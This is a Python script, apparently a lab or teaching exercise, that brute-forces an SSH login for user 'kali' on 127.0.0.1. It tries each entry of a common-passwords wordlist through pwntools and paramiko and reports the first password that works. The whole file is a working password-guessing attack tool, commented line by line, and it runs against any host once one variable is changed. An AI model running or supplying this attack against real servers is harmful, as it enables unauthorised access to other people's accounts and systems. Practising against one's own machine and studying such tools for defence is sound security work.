# Importing necessary libraries
from pwn import ssh  # Importing ssh from pwnlib for SSH connection handling
import paramiko  # Importing Paramiko for exception handling related to SSH

# Configuration variables for SSH connection
host = "127.0.0.1"  # The target host IP
username = "kali"  # Username for SSH authentication
attempts = 0  # Counter to keep track of the number of password attempts

# Opening and reading the password list
with open("/usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")  # Stripping newline characters from each password
        try:
            print(f"[{attempts}] Attempting password: '{password}'")  # Printing the attempt
            response = ssh(host=host, user=username, password=password, timeout=1)  # Attempting SSH connection

            if response.connected():  # Check if the connection was successful
                print(f"[>] Valid password found: '{password}'!")  # Informing the user of a successful attempt
                response.close()  # Closing the connection
                break  # Exiting the loop after finding a valid password

            response.close()  # Ensuring the connection is closed after each attempt
        except paramiko.ssh_exception.AuthenticationException:  # Handling authentication failure
            print("[X] Invalid password")  # Printing invalid password message
            
        attempts += 1  # Incrementing the attempt counter
